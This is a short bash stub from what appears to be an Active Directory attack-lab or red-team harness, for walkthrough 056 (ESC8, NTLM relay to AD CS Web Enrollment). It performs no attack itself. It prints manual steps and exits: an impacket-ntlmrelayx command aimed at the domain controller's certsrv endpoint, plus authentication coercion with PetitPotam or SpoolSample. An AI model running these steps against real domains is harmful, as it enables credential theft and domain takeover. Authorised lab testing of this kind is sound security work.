#!/bin/bash
# CONFIGURED—/CertSrv active on dc01; requires interactive NTLM relay
# Requires: impacket-ntlmrelayx targeting http://$DC01/certsrv/certfnsh.asp + coercion
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "056" "ESC8 — NTLM relay to ADCS Web Enrollment"

log "WT#056 requires NTLM relay setup — see walkthrough doc"
echo "Manual steps:"
echo "  1. Start relay: impacket-ntlmrelayx -t http://$DC01/certsrv/certfnsh.asp -smb2support"
echo "  2. Coerce auth from target (PetitPotam, SpoolSample, etc.)"
echo "  3. Relay captures TGT and issues certificate"
exit 1
